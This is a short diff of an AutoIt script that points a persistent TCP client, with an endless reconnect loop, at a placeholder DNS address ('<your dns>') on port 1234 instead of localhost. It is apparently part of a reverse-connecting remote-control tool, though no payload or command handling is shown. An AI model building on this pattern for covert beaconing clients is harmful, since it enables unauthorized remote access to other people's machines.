@@ -4,11 +4,11 @@ Global $Socket
 Global $Recibe
 
 Global $IP 
-Global $sDnsAddr = 
+Global $sDnsAddr = "<your dns>"
 Global $PORT = 1234
 
-$IP = "127.0.0.1"
-;$IP  = TCPNameToIP($sDnsAddr)
+;$IP = "127.0.0.1"
+
 
 While 1 ;Reconeccion
    _Conectar()
@@ -33,6 +33,7 @@ Func _Conectar()
    While TCPStartup()=0
           sleep (10)
    WEnd
+   $IP  = TCPNameToIP($sDnsAddr)
    While True
           $Socket=TCPConnect ($IP,$PORT)
           If $Socket>0 Then
